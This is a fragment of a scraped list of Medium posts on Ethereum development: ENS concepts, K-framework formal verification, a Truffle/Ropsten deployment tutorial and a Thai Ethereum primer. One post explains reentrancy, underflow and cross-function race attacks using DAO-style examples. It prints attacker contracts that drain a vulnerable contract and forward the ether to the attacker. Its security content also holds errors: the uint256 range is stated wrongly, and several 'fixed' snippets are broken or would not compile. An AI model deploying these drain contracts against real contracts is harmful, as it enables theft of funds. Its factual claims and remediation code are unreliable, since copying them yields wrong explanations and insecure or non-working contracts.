tokens available for developers who help to build tools, SDKs and APIs for further advancement and development of Ambrosus Ecosystem. Get in touch with the team if interested via info [at] ambrosus.com", "responses": 0, "tags": ["Ambrosus Technical Blog", "API", "Software Development", "JavaScript", "Solidity"]}, {"title": "Smart Contract Attacks [Part 1] - 3 Attacks We Should All Learn From The DAO", "post_link": "https://medium.com/hackernoon/smart-contract-attacks-part-1-3-attacks-we-should-all-learn-from-the-dao-909ae4483f0a?source=search_post", "author_name": "Pete Humiston", "author_link": "https://medium.com/@petehumiston", "publish_date": "2018-07-05", "last_modified_date": "2019-05-09", "readtime": "9.51", "claps": 203, "voters": 42, "content": "Smart Contract Attacks [Part 1] - 3 Attacks We Should All Learn From The DAOPete HumistonFollowJul 5, 2018 \u00b7 10 min readIf you\u2019ve been following the crypto long enough you\u2019ve probably heard of one or two smart contract attacks, attacks which have resulted in the theft of cryptoassets worth tens of millions of dollars. The most notable attack remains the Decentralized Autonomous Organization (DAO), one of crypto\u2019s most highly anticipated projects of all time and a poster-child of the revolutionary capabilities of smart contracts. While most have heard of these attacks, few truly understand what went wrong, how it went wrong, and how to avoid making the same mistake twice.Smart contracts are dynamic, complex, and incredibly powerful. While their potential is unimaginable, its unlikely they\u2019ll become attack-proof overnight. That said, it\u2019s imperative for the future of crypto that we all learn from prior mistakes and grow together. Although the DAO is a thing of the past, it remains a great example of susceptible smart contract attacks that developers, investors, and community members should familiarize themselves with.In Part 1 of my Smart Contract Attacks series, I\u2019ll be walking you through in great detail (Solidity code included) 3 common attacks we can learn from the DAO. Whether you\u2019re a developer, investor, or fan of crypto, being knowledgeable on these attacks will equip you with a deeper understanding and appreciation for this promising tech.Follow Me on TwitterWant to Write Your First Smart Contract? Check Out My TutorialAttack #1: ReentrancyA reentrancy attack occurs when the attacker drains funds from the target by recursively calling the target\u2019s withdraw function, as was the case with the DAO. When the contract fails to update its state (a user\u2019s balance) prior to sending funds, the attacker can continuously call the withdraw function to drain the contract\u2019s funds. Anytime the attacker receives Ether, the attacker\u2019s contract automatically calls its fallback function, function (), which is written to call the withdraw function yet again. At this point the attack has entered a recursive loop and the contract\u2019s funds start to siphon off to the attacker. Because the target contract gets stuck calling the attacker\u2019s fallback function, the contract is never able to update the attacker\u2019s balance. The target contract is tricked into thinking nothing is wrong... To be clear, a fallback functions is a contract\u2019s function that is automatically executed whenever the contract receives Ether and zero data.The AttackThe attacker donates ether to the target contractThe target contract updates the attacker\u2019s balance for the donated EtherThe attacker requests the funds backFunds are sent backThe attacker\u2019s fallback function is triggered and calls for a subsequent withdrawalThe smart contract\u2019s logic to update the attacker\u2019s balance has yet to be executed, thus the withdraw is successfully called againFunds are sent to the attackerSteps 5\u20137 repeatOnce the attack is over, the attacker sends funds from their contract to their personal addressThe recursive loop of a reentrancy attackUnfortunately there is no way to stop the attack once it has started. The attacker\u2019s withdrawal function will be called over and over again until the contract either runs out of gas or the victim\u2019s ether balance has been depleted.The CodeBelow is a simplified version of the susceptible DAO contract, which includes comments to better understand the contract for those unfamiliar with programming/solidity.contract babyDAO {     /* assign key/value pair so we can look up     credit integers with an ETH address */     mapping (address => uint256) public credit;     /* a function for funds to be added to the contract,    sender will be credited amount sent */    function donate(address to) payable {        credit[msg.sender] += msg.value;    }     /*show ether credited to address*/    function assignedCredit(address) returns (uint) {        return credit[msg.sender];    }     /*withdrawal ether from contract*/    function withdraw(uint amount) {        if (credit[msg.sender] >= amount) {        msg.sender.call.value(amount)();        credit[msg.sender] -= amount;    }  }}If we take a look at function withdraw() we can see that the DAO contact uses address.call.value() to send funds to the msg.sender. Not only that, but the contract updates the state of credit[msg.sender] after the funds have been sent. Both are a big no-no. Recognizing these vulnerabilities in the contract code, an attacker could use a contract like contract ThisIsAHodlUp {} below to liquidate all of contract babyDAO{} funds.import \u2018browser/babyDAO.sol\u2019;contract ThisIsAHodlUp {        /* assign babyDAO contract as \"dao\" */    babyDAO public dao = babyDAO(0x2ae...);    address owner;     /*assign contract creator as owner*/    constructor(ThisIsAHodlUp) public {        owner = msg.sender;    }    /*fallback function, withdraws funds from babyDAO*/    function() public {         dao.withdraw(dao.assignedCredit(this));    }        /*send drained funds to attacker\u2019s address*/    function drainFunds() payable public{        owner.transfer(address(this).balance);    }}Notice that the fallback function, function(), calls the withdraw function of dao, or contract babyDAO{}, to steal funds from the contract. On the other hand, function drainFunds() will be called at the end of the attack when the attacker wants to send all of the stolen ether to their address.The SolutionBy now it should be clear that reentrancy attacks take advantage of two particular smart contract vulnerabilities. The first being when a contract\u2019s state is updated AFTER funds have been sent and not BEFORE. By failing to update the contract state prior to sending funds, the function can be interrupted mid-computation and the contract will be tricked into thinking the funds haven\u2019t actually been sent yet. The second vulnerability is when the contract incorrectly uses address.call.value() to send funds, as opposed to address.transfer() or address.send() . Both are limited to a stipend of 2,300 gas, enough to merely log an event and NOT multiple external calls.Update contract balance BEFORE sending fundsUse address.transfer() or address.send() when sending fundscontract babyDAO{    ....    function withdraw(uint amount) {        if (credit[msg.sender] >= amount) {        credit[msg.sender] -= amount; /* updates balance first */        msg.sender.send(amount)(); /* send funds properly */        }}Attack 2: UnderflowAlthough the DAO contract didn\u2019t fall victim to an underflow attack, we can leverage our existing babyDAO contract{} to better understand how this all too common attack that could have also occurred.First things first, let\u2019s make sure we understand what an uint256 is. A uint256 is an unsigned integer of 256 bits (unsigned, as in only positive integers). The Ethereum Virtual Machine was designed to use 256 bits as its word size, or the number of bits processed by a computer\u2019s CPU in one go. Because EVM is limited to 256 bits in size, the assigned number range is 0 to 4,294,967,295 (2\u00b2\u2075\u2076). If we go over this range, the figure is reset to the bottom of the range (2\u00b2\u2075\u2076 + 1 = 0). If we go under this range, the figure is reset to the top end of the range (0\u20131= 2\u00b2\u2075\u2076).Underflow takes place when we subtract a number greater than zero from zero, resulting in a newly assigned integer of 2\u00b2\u2075\u2076. Now, if an attacker\u2019s balance experiences underflow, the balance would be updated such that all funds could be stolen.The AttackThe attacker initiates the attack by sending 1 Wei to the target contractThe contract credits the sender for funds sentA subsequent withdrawal of the same 1 Wei is calledThe contract subtracts 1 Wei from the sender\u2019s credit, now the balance is zero againBecause the target contract sends ether to the attacker, the attacker\u2019s fallback function is also trigger and a withdrawal is called againThe withdrawal of 1 Wei is recordedThe balance of the attacker\u2019s contract has been updated twice, the first time to zero and the second time to -1The attacker\u2019s balance is reset to 2\u00b2\u2075\u2076The attacker completes the attack by withdrawing all of the funds of the targeted contractThe Codeimport \u2018browser/babyDAO\u2019;contract UnderflowAttack {     babyDAO public dao = babyDAO(0x2ae\u2026);    address owner;    bool performAttack = true;     /*set contract creator as owner*/     constructor{ owner = msg.sender;}     /*donate 1 wei, withdraw 1 wei*/    function attack() {        dao.donate.value(1)(this);        dao.withdraw(1);    }     /*fallback function, results in 0\u20131 = 2**256 */    function() {       if (performAttack) {       performAttack = false;       dao.withdraw(1);       }     }      /*extract balance from smart contract*/    function getJackpot() {        dao.withdraw(dao.balance);        owner.send(this.balance);    }}The SolutionTo avoid falling victim to an underflow attack, best practice is to check if the updated integer stays within its byte range. We can add a parameter check in our code to act as a last line of defense. The first line of function withdraw() checks for adequate funds, the second checks for overflow, and the third checks for underflow.contract babysDAO{ ....     /*withdrawal ether from contract*/    function withdraw(uint amount) {        if (credit[msg.sender] >= amount         && credit[msg.sender] + amount >= credit[msg.sender]         && credit[msg.sender] - amount <= credit[msg.sender]) {        credit[msg.sender] -= amount;        msg.sender.send(amount)();    }}Notice that our code above also updates the user\u2019s balance BEFORE sending funds, as discussed earlier.Attack #3: Cross-Function Race ConditionLast but not least, the Cross-Function Race Condition Attack. As discussed in in our Reentrancy attack, the DAO contract failed to correctly update the contract state and allowed for funds to be stolen. Part of the issue with the DAO and external calls in general is the potential for a Cross-Function Race Condition to occur.While all transactions in Ethereum run serially (one after another), external calls (a call to another contract or address) can become a recipe for disaster if not properly managed. In a perfect world, they\u2019re avoided entirely. A cross-function race condition occurs when two functions are called and share the same state. The contract is tricked into thinking that two contract states exist, when in reality there is only one true contract state that can exists. We can\u2019t have X = 3 and X = 4 at the same time\u2026Let\u2019s clarify this concept with an example.The Attack & The Codecontract crossFunctionRace{     mapping (address => uint) private userBalances;    /* uses userBalances to transfer funds */    function transfer(address to, uint amount) {        if (userBalances[msg.sender] >= amount) {            userBalances[to] += amount;            userBalances[msg.sender] -= amount;        }    }    /* uses userBalances to withdraw funds */    function withdrawalBalance() public {        uint amountToWithdraw = userBalances[msg.sender];        require(msg.sender.send(amountToWithdraw)());        userBalances[msg.sender] = 0;    }}The contract above has two functions \u2014 one for transferring funds and another for withdrawing funds. Let\u2019s assume that an attacker calls function transfer() while simultaneously making the external call function withdrawalBalance(). The state of userBalance[msg.sender] is being pulled in two different directions. The user\u2019s balance not yet been set 0, but the attacker will also be able to transfer funds despite the fact they\u2019ve already been withdrawn. In this case the contract has allowed for the attacker to double spend, one of the problems blockchain technology was designed to solve.Note: Cross-function race conditions can occur across multiple contracts if those contracts share state.Finishing all internal work first before calling external functionsAvoid making external callsMarking external call functions as \u201cuntrusted\u201d when unavoidableUsing a mutex when external calls are unavoidablePer the contract below, we can see an example of a contract that 1). conducts internal work prior to making external calls and 2). marks all external call functions as \u201cuntrusted\u201d. Our contract allows for funds to be sent to an address and allows users a one-time reward for having initially deposited funds into the contract.contract crossFunctionRace{     mapping (address => uint) private userBalances;    mapping (address => uint) private reward;    mapping (address => bool) private claimedReward;    //makes external call, need to mark as untrusted    function untrustedWithdraw(address recipient) public {        uint amountWithdraw = userBalances[recipient];        reward[recipient] = 0;        require(recipient.call.value(amountWithdraw)());    }     //untrusted because withdraw is called, an external call    function untrustedGetReward(address recipient) public {        //check that reward hasn\u2019t already been claimed        require(!claimedReward[recipient]);          //internal work first (claimedReward and assigning reward)        claimedReward = true;        reward[recipient] += 100;        untrustedWithdraw(recipient);    } }As one can see, the contract\u2019s first function makes an external call when sending funds to a user\u2019s contract/address. Likewise, the reward function also uses the withdraw function for sending the one-time reward and is thus untrusted as well. Just as important, the contract executes all internal work first. Like our reentrancy attack example, function untrustedGetReward() grants the user credit for his/her one time reward before allowing for withdraw to prevent a cross-function race condition from occurring.In a perfect world, smart contracts do not need to rely on making external calls. The reality is that external calls in many cases are next to impossible to work around. For that reason, using a mutex to \u201clock\u201d some state and granting only the owner the ability to change the state can help avoid a costly disaster. Although mutexes are incredibly effective, they can get tricky when used for multiple contracts. If you use mutexes to protect against race conditions, you will need to carefully ensure that there are no other ways for a lock to be claimed and never released. If going the mutex way, make sure you\u2019ve thoroughly understand the potential dangers when writing contracts with them (deadlocks, livelocks, etc.).contract mutexExample{     mapping (address => uint) private balances;    bool private lockBalances;     function deposit() payable public returns (bool) {                /*check if lockBalances is unlocked before proceeding*/        require(!lockBalances);        /*lock, execute, unlock */        lockBalances = true;        balances[msg.sender] += msg.value;        lockBalances = false;        return true;    }     function withdraw(uint amount) payable public returns (bool) {        /*check if lockBalances is unlocked before proceeding*/        require(!lockBalances && amount > 0 && balances[msg.sender]        >= amount);        /*lock, execute, unlock*/        lockBalances = true;         if (msg.sender.call(amount)()) {            balances[msg.sender] -= amount;        }         lockBalances = false;        return true;    } }Above we can see contract mutexExample() has private lock states for executing function deposit() and function withdraw() . The lock will stop users from successfully calling withdraw() before the first call finishes, preventing any sort of cross-function race condition from occurring.At The End of The Day\u2026With great power comes great responsibility. Although blockchain and smart contract technology continues to evolve day by day, the stakes remain high. Attackers have not let up on looking for the right opportunity to pounce on poorly designed contracts and run away with the goods. It\u2019s on all of us to ensure that we learn from the failures of our peers, as well as ourselves, if we so desire to grow and push boundaries. Hopefully through this post, and the rest of my series, you\u2019ll have walked away feeling more confident in your understanding of smart contract attacks and smart contracts in general. Feel free to follow me on Medium & Twitter (@Pete_Humiston) for more upcoming content on Crypto, Blockchain, and Solidity.-Pete HumistonIf you enjoyed this post, feel free to give a \u201cclap\u201d and/or leave a comment below!", "responses": 2, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Bitcoin", "Cryptocurrency"]}, {"title": "A developer\u2019s guide to ENS concepts", "post_link": "https://medium.com/the-ethereum-name-service/a-developers-guide-to-ens-concepts-7004eea8a073?source=search_post", "author_name": "Nick Johnson", "author_link": "https://medium.com/@weka", "publish_date": "2017-05-10", "last_modified_date": "2018-04-14", "readtime": "2.68", "claps": 155, "voters": 42, "content": "A developer\u2019s guide to ENS conceptsNick JohnsonFollowMay 10, 2017 \u00b7 3 min readIf you\u2019re looking at using the Ethereum Name Service inside your application or contract, or wanting to build something on top of ENS like a registrar or resolver, this post will give you the background you need to get started.ENS\u2019s three componentsENS is constructed from three primary components: the registry, registrars, and resolvers.The registry is the central directory of ENS; it keeps a list of every ENS domain (and subdomain, and sub-sub-domain, and so forth).Every name in ENS can be found by looking it up in the ENS registry, and it\u2019s the only component you need the address for.The registry maintains three pieces of information about every name it knows about:The account that owns the name (owner).The address of an (optional) resolver contract.A time-to-live for caching.Names can be owned by external accounts or by contracts. When a contract owns a name, we call that contract a registrar.Registrars are the second component of ENS, and are responsible for allocating new names to users. The best known of these is the .eth registrar, but anyone who owns a domain can assign ownership to a contract and create a registrar of their own. Registrars don\u2019t have any special permissions \u2014 they just use their ability to tell the registry to create subdomains.Resolvers are contracts that can tell you the resource associated with a name \u2014 such as an Ethereum address, a swarm hash, or a public key. Anyone can implement a resolver, as long as it implements a certain agreed-upon interface, and point their domain at it. For convenience, there are \u2018public\u2019 resolvers that anyone can point their domain at and use.Looking up names in ENSLooking up an ENS name is a two-step process. First, call the ENS registry\u2019s resolver method, to fetch the address of the resolver responsible for the name. Then, ask that resolver for the resource you\u2019re interested in.For instance, to look up the Ethereum address of \u2018vitalik.eth\u2019, we\u2019d first call resolver(namehash('vitalik.eth')) on the registry, then we\u2019d call addr(namehash('vitalik.eth')) on the resolver whose address was returned by the first call. If we wanted the swarm hash for \u2018vitalik.eth\u2019 instead, the first step would remain the same, but in the second step we\u2019d call content(namehash('vitalik.eth')) on the resolver.namehashENS does not operate directly on names \u2014 there are a number of reasons for this, one of which is that parsing and processing text on the blockchain is very inefficient. Instead, ENS operates on secure hashes.A single component of a name \u2014 eg, vitalik or eth can be simply hashed using keccak256 (commonly referred to as sha3 in Ethereum). We call the result a \u2018label hash\u2019 or just \u2018label\u2019.Because ENS is a hierarchal system, however, we need some way to represent hierarchal names. We cannot simply hash the whole name \u2014 eg, sha3('vitalik.eth') because there would be no way to answer questions like \u201cis vitalik.eth a subdomain of eth?\" or \u201cwhat is the hash of the \u2018wallet\u2019 subdomain of this domain?\u201dTo solve this, ENS hashes names using a system called namehash. Here\u2019s the full definition of namehash:namehash('') -> '0x0000000000000000000000000000000000000000000000000000000000000000'namehash('a.xyz') -> sha3(namehash('xyz'), sha3('a'))Namehash is thus a recursive function: to calculate the final hash, you start with the rightmost component, and repeatedly calculate the label hash, then combine it with the previous component\u2019s name hash.Usually, you won\u2019t need to concern yourself with the internal details of namehash \u2014 ENS libraries will handle it for you, and you can look at it as a black box that turns names into hashes.ResourcesThe ENS repository contains source code for all the primary components of ENS.The ENS documentation goes into a lot more detail about concepts and API functionality, with practical details and examples.EIP 137 defines ENS in full, and provides references to the different resolver profiles currently defined.", "responses": 1, "tags": ["Ethereum", "Ens", "Blockchain", "Solidity"]}, {"title": "Formal Verification for n00bs \u2014 Part 1: The K ecosystem", "post_link": "https://medium.com/ethworks/formal-verification-for-n00bs-part-1-b4781db2a383?source=search_post", "author_name": "Marek Kirejczyk", "author_link": "https://medium.com/@marekkirejczyk", "publish_date": "2019-01-25", "last_modified_date": "2019-04-04", "readtime": "3.00", "claps": 566, "voters": 41, "content": "Formal Verification for n00bs \u2014 Part 1: The K ecosystemMarek KirejczykFollowJan 25 \u00b7 4 min readThis is first in a series of blog posts on Formal Verification:Part 1: The K ecosystemPart 2: Proving the correctness of a tokenPart 3: Formal Verification for n00bs -Part 3: An attempt to prevent classic hack with ActPart 4: Understanding K languageThe motivation for Formal VerificationSecurity of smart contracts is still a crucial challenge: we all remember the DAO, parity hacks, a bunch of smaller attacks and the most recent delayed hard fork. We would like to see the future in which we can be way more confident about our code.Depending how you count, event over a half a billion dollars (by today\u2019s Ethereum evaluation), was lost in a couple of biggest smart contract hacks.What about if behind every responsible piece of code stands pure solid mathematics instead of personal conviction of developers? With formal verification tools for Ethereum finally maturing, it is now not only possible but also practical.In this and following post we will be getting step by step into the world of K-framework, which allows to formally verify EVM smart contracts.The heart: Semantics and the K languageThe heart of the whole ecosystem is language K. K is a language specially designed for defining semantics. Semantics describes the behavior of computer programs. For example, when we say that a construction x++ for x that is uint means that a program in Solidity executing it will always increase the value of x by 1, except for one value x = 2^256\u20131:Example of \u201clow-level\u201d semantics in plain words:x++ set value of x to 0, if x = 2^256\u20131;x++ sets value of x to x+1; otherwise.This type of semantics, describing the meaning of every single instruction, is a kind of low-level definition. Besides that, what K also allows is to create high-level semantics, feasible to formulate semantics like the one below.Example of \u201chigh-level\u201d semantics in plain words:Function bool isPrime(int x) returns true only if x is a prime.To formally prove that your smart contract behaves as you wish, you need to provide:low-level semantics of the language you use.code of your program (EVM bytecode)provide high-level (intended) semantics of your programProviding high-level semantics is the most interesting and at the same time most challenging: you have to formulate how you actually wish that your program behaves.MagicThen the magic starts. The verifier is proving (or finding a counter-example) that your program together with low-level semantics of the programming language that you use, is indeed doing exactly the same stuff as behavior described by provided high-level semantics.The K ecosystemThe K-framework ecosystem is somewhat complex but contains all you need:K language that allows you to write any kind of semantics;Tooling that allows proving semantics using Z3 - a tool for automatic proving created by Microsoft Research;Semantics for Ethereum Virtual Machine - KEVM, written by Everett Hildenbrandt;Two (EDIT) c\u0336o\u0336m\u0336p\u0336e\u0336t\u0336i\u0336n\u0336g\u0336 DSLs to create high-level semantics: act (part of KLAB created by dapphub) and eDSL (created by runtimeverification).The ecosystem for creating proofs on EVMSo the only additional work to do after the developing process is to write high-level intended semantics and put all the machinery to work.The high-level semantics you can do it directly in K or use one of the mentioned DSLs tailored, particularly for Solidity.Let\u2019s take a look at the exampleThe natural questions are born here: how complicated high-level semantics is possible to formulate in K? Below is an example of high-level semantics of a ERC20 transfer function, written in Dapphub/klab specification language:What does it all mean? We will answer this question in the very next blog post in the series. Spring is coming for formal verification!Special thanks to Tomasz Kazana who\u2019s work on formal verification in Ethworks lead to writing this blog post.Stay tunedTo get updates on formal verification and other Ethereum related topic follow us on twitter: @ethworksYou can also follow us on Medium if you like the story \ud83d\udc4f \ud83d\udc4f \ud83d\udc4f.", "responses": 4, "tags": ["Ethereum", "Kvm", "Formal Verification", "Solidity", "Smart Contracts"]}, {"title": "5 minute guide to deploying smart contracts with Truffle and Ropsten", "post_link": "https://medium.com/coinmonks/5-minute-guide-to-deploying-smart-contracts-with-truffle-and-ropsten-b3e30d5ee1e?source=search_post", "author_name": "Nicole Zhu", "author_link": "https://medium.com/@nicolezhu", "publish_date": "2018-08-25", "last_modified_date": "2019-02-28", "readtime": "2.02", "claps": 217, "voters": 41, "content": "5 minute guide to deploying smart contracts with Truffle and RopstenA recommended & quick setup for DApp development with boilerplateNicole ZhuFollowAug 25, 2018 \u00b7 3 min readYou have various setup options for deploying, migrating, and accessing smart contracts. Depending on the level of control and visibility you want into the EVM (Ethereum Virtual Machine), you can choose from using an online IDE like Remix, to running a full Ethereum mining node via Geth.Of course, Truffle makes compiling & deploying smart contracts markedly easier, while still giving you visibility and control.1 Minute Shortcut: fork this boilerplate templateHere\u2019s a framework depicting both common setups and what we\u2019ll tackle today: the path in blue.This tutorial coversConfigure Truffle Framework to the Ropsten test networkUse it to deploy (or migrate) a contract instanceAccess the deployed instance and interact with it (via Truffle console)Make sure you already haveSave your wallet mnemonic from MetamaskGet some test etherGet a Ropsten API key from InfuraDetailed Walkthrough1. Set up Trufflenpm install -g truffleMake an empty repository, cd into it, thentruffle initInstall HDWalletProvidernpm install --save truffle-hdwallet-provider2. Create your contractIn ./contracts create a new contract called HelloWorld.sol with the following code:pragma solidity ^0.4.23;contract HelloWorld {    function sayHello() public pure returns(string){        return(\u201chello world\u201d);    }}3. Deploy your contractIn ./migrations, create a deployment script specifically named 2_deploy_contracts.js with the following code:var HelloWorld = artifacts.require(\u201cHelloWorld\u201d);module.exports = function(deployer) {    deployer.deploy(HelloWorld, \u201chello\u201d);    // Additional contracts can be deployed here};4. Configure Ropsten network and the providerIn truffle.js, add the following snippet inside module.exports:Make sure to replace mnemonic and API_KEY with your own.Security note: remember to .gitignore the file containing your wallet mnemonic!Now deploy (or migrate) your contract to Ropsten as follows. By default, Truffle only deploys to the local developer network.truffle deploy --network ropstenYou should see a console log as follows:Running migration: 1_initial_migration.jsDeploying Migrations\u2026\u2026 0xd01dd7...Migrations: 0xf741...Saving successful migration to network\u2026\u2026 0x78ed...Saving artifacts\u2026Running migration: 2_deploy_contracts.jsDeploying HelloWorld\u2026\u2026 0x0aa9...HelloWorld: [SAVE THIS ADDRESS!!]Saving successful migration to network\u2026\u2026 0xee95...Saving artifacts\u2026Tip: Make sure to save your contract address for future reference. If you lose it, proceed to Etherscan to examine your wallet address transactions.5. Access your deployed contractSet up your Truffle console to Ropsten network:truffle console --network ropstenAccess your deployed contract instance via:HelloWorld.deployed().then(function(instance){return instance });Or you can retrieve the instance by its public address via:web3.eth.contract(HelloWorld.abi, contractAddress)where HelloWorld.abi is the locally compile abi, and contractAddress is your publicly deployed contract instance.6. Finally, invoke contract function and say hello!HelloWorld.deployed().then(function(instance){return instance.sayHello()});Click to read today\u2019s top story", "responses": 8, "tags": ["Ethereum", "Smart Contracts", "Cryptocurrency", "Solidity", "Tutorial"]}, {"title": "[Ethereum] \u0e15\u0e2d\u0e19\u0e17\u0e35\u0e48 0 : \u0e1e\u0e37\u0e49\u0e19\u0e10\u0e32\u0e19 Ethereum, Smart Contract \u0e17\u0e35\u0e48\u0e04\u0e27\u0e23\u0e23\u0e39\u0e49\u0e41\u0e25\u0e30 Plasma \u0e04\u0e23\u0e48\u0e32\u0e27 \u0e46", "post_link": "https://medium.com/cochain/ethereum-%E0%B8%95%E0%B8%AD%E0%B8%99%E0%B8%97%E0%B8%B5%E0%B9%88-0-%E0%B8%9E%E0%B8%B7%E0%B9%89%E0%B8%99%E0%B8%90%E0%B8%B2%E0%B8%99-ethereum-smart-contract-%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%84%E0%B8%A7%E0%B8%A3%E0%B8%A3%E0%B8%B9%E0%B9%89%E0%B9%81%E0%B8%A5%E0%B8%B0-plasma-%E0%B8%84%E0%B8%A3%E0%B9%88%E0%B8%B2%E0%B8%A7-%E0%B9%86-c13b3c0b9b78?source=search_post", "author_name": "Methus Kaewsaikao", "author_link": "https://medium.com/@methuz", "publish_date": "2019-05-08", "last_modified_date": "2019-05-08", "readtime": "3.96", "claps": 131, "voters": 40, "content": "[Ethereum] \u0e15\u0e2d\u0e19\u0e17\u0e35\u0e48 0 : \u0e1e\u0e37\u0e49\u0e19\u0e10\u0e32\u0e19 Ethereum, Smart Contract \u0e17\u0e35\u0e48\u0e04\u0e27\u0e23\u0e23\u0e39\u0e49\u0e41\u0e25\u0e30 Plasma \u0e04\u0e23\u0e48\u0e32\u0e27 \u0e46Methus KaewsaikaoFollowMay 8 \u00b7 4 min read\u0e43\u0e19\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e0b\u0e35\u0e23\u0e35\u0e48\u0e2a\u0e4c\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e21\u0e32\u0e17\u0e33\u0e04\u0e27\u0e32\u0e21\u0e23\u0e39\u0e49\u0e08\u0e31\u0e01 Ethereum Blockchain \u0e41\u0e25\u0e30\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Smart Contract \u0e1a\u0e19 Ethereum \u0e42\u0e14\u0e22\u0e01\u0e48\u0e2d\u0e19\u0e2d\u0e37\u0e48\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e21\u0e32\u0e1b\u0e39\u0e1e\u0e37\u0e49\u0e19\u0e10\u0e32\u0e19\u0e04\u0e23\u0e48\u0e32\u0e27 \u0e46 \u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e01\u0e31\u0e1a Ethereum \u0e01\u0e31\u0e19\u0e01\u0e48\u0e2d\u0e19Ethereum \u0e16\u0e39\u0e01\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e42\u0e14\u0e22 Vitalik Buterin \u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e43\u0e19\u0e1b\u0e35 2013 \u0e17\u0e35\u0e48 Vitalik \u0e44\u0e14\u0e49\u0e40\u0e2a\u0e19\u0e2d\u0e43\u0e2b\u0e49 Bitcoin \u0e21\u0e35 Scripting Language \u0e17\u0e35\u0e48\u0e40\u0e1b\u0e47\u0e19 Turing Complete \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e19\u0e31\u0e01\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2a\u0e23\u0e49\u0e32\u0e07 Application \u0e1a\u0e19 Bitcoin \u0e44\u0e14\u0e49 \u0e41\u0e15\u0e48\u0e16\u0e39\u0e01\u0e1b\u0e0f\u0e34\u0e40\u0e2a\u0e18\u0e08\u0e32\u0e01\u0e01\u0e25\u0e38\u0e48\u0e21\u0e1c\u0e39\u0e49\u0e1e\u0e31\u0e12\u0e19\u0e32 BitcoinVitalik \u0e40\u0e25\u0e22\u0e40\u0e23\u0e34\u0e48\u0e21\u0e2a\u0e23\u0e49\u0e32\u0e07 Ethereum \u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e42\u0e14\u0e22\u0e21\u0e35\u0e04\u0e33\u0e08\u0e33\u0e01\u0e31\u0e14\u0e04\u0e27\u0e32\u0e21\u0e17\u0e35\u0e48\u0e27\u0e48\u0e32 \u201cDecentralised mining network and software development platform rolled into one\u201d \u0e01\u0e25\u0e48\u0e32\u0e27\u0e04\u0e37\u0e2d Ethereum \u0e40\u0e1b\u0e47\u0e19 Network \u0e02\u0e2d\u0e07\u0e2a\u0e34\u0e19\u0e17\u0e23\u0e31\u0e1e\u0e22\u0e4c\u0e17\u0e35\u0e48\u0e40\u0e01\u0e34\u0e14\u0e08\u0e32\u0e01\u0e01\u0e32\u0e23\u0e02\u0e38\u0e14\u0e40\u0e2b\u0e21\u0e37\u0e2d\u0e19 Bitcoin \u0e41\u0e15\u0e48\u0e40\u0e1e\u0e34\u0e48\u0e21\u0e04\u0e27\u0e32\u0e21\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19\u0e0b\u0e2d\u0e1f\u0e15\u0e4c\u0e41\u0e27\u0e23\u0e4c\u0e1a\u0e19\u0e2a\u0e34\u0e19\u0e17\u0e23\u0e31\u0e1e\u0e22\u0e4c\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e14\u0e49\u0e27\u0e22 \u0e0b\u0e36\u0e48\u0e07\u0e0b\u0e2d\u0e1f\u0e15\u0e4c\u0e41\u0e27\u0e23\u0e4c\u0e19\u0e31\u0e49\u0e19\u0e40\u0e23\u0e35\u0e22\u0e01\u0e01\u0e31\u0e19\u0e27\u0e48\u0e32 Smart ContractEthereum \u0e19\u0e31\u0e49\u0e19\u0e23\u0e30\u0e14\u0e21\u0e17\u0e38\u0e19\u0e14\u0e49\u0e27\u0e22 Bitcoin \u0e42\u0e14\u0e22\u0e43\u0e19\u0e23\u0e2d\u0e1a Pre-sale \u0e19\u0e31\u0e49\u0e19\u0e21\u0e35\u0e23\u0e32\u0e04\u0e32 2000 Ether/1 Bitcoin \u0e0b\u0e36\u0e48\u0e07 Ethereum \u0e19\u0e31\u0e1a\u0e27\u0e48\u0e32\u0e40\u0e1b\u0e47\u0e19 ICO \u0e15\u0e31\u0e27\u0e41\u0e23\u0e01 \u0e46 \u0e43\u0e19\u0e42\u0e25\u0e01Smart Contract \u0e1a\u0e19 Ethereum \u0e08\u0e30\u0e16\u0e39\u0e01\u0e40\u0e02\u0e35\u0e22\u0e19\u0e42\u0e14\u0e22\u0e20\u0e32\u0e29\u0e32 Solidity \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e20\u0e32\u0e29\u0e32\u0e17\u0e35\u0e48\u0e16\u0e39\u0e01\u0e2d\u0e2d\u0e01\u0e41\u0e1a\u0e1a\u0e21\u0e32\u0e43\u0e2b\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e17\u0e33\u0e07\u0e32\u0e19\u0e1a\u0e19 Machine \u0e17\u0e35\u0e48\u0e40\u0e1b\u0e47\u0e19 Ethereum \u0e42\u0e14\u0e22\u0e40\u0e09\u0e1e\u0e32\u0e30 \u0e42\u0e14\u0e22\u0e08\u0e30\u0e21\u0e35\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e42\u0e04\u0e49\u0e14\u0e41\u0e1a\u0e1a\u0e19\u0e35\u0e49pragma solidity ^0.5.0;contract HelloWorld {    function sayHello() public pure returns(string memory){        return \"hello world\";    }}\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19\u0e42\u0e1b\u0e23\u0e41\u0e01\u0e23\u0e21\u0e1a\u0e19 Ethereum \u0e19\u0e31\u0e49\u0e19\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35 Backend Server \u0e40\u0e1e\u0e23\u0e32\u0e30 Ethereum 